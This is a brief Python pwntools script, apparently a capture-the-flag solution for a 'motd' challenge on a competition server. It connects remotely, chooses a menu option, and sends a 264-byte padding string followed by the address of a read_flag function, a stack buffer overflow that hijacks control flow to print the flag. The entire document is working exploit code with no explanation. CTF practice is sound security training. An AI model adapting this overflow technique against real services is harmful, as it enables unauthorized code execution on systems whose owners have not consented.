from pwn import *


e = ELF('motd')

# p = process('motd')
p = remote('motd.ctfcompetition.com', 1337)

p.recvuntil(': ')
p.sendline('2')
p.recvuntil(': ')
p.sendline('A' * 264 + p64(e.symbols['read_flag']))

print p.recvall()